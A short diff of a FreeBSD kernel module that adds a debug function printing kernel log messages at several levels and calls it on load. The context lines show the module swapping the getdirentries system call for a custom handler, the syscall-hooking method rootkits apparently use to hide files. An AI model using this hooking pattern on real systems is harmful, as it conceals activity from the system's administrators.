@@ -430,6 +430,13 @@ static void unload(void) {
     unload_custom_fork_event_handler();
 }
 
+static void test(void) {
+    printf(KERN_INFO "This will appear in standard system message color\n");
+    printf(KERN_WARNING "This will appear with more urgency\n");
+    printf(KERN_NOTICE "This will appear with more urgency\n");
+    printf(KERN_DEBUG "This will appear with more urgency\n");
+}
+
 // delcare LKM functionality
 static int event_handler(struct module *module, int event, void *arg) {
     switch (event) {
@@ -445,6 +452,7 @@ static int event_handler(struct module *module, int event, void *arg) {
             load_custom_fork_event_handler();
             original_getdirentries = sysent[SYS_getdirentries].sy_call;
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)custom_getdirentries;
+            test();
             return 0;
         case MOD_UNLOAD:
             sysent[SYS_getdirentries].sy_call = original_getdirentries;
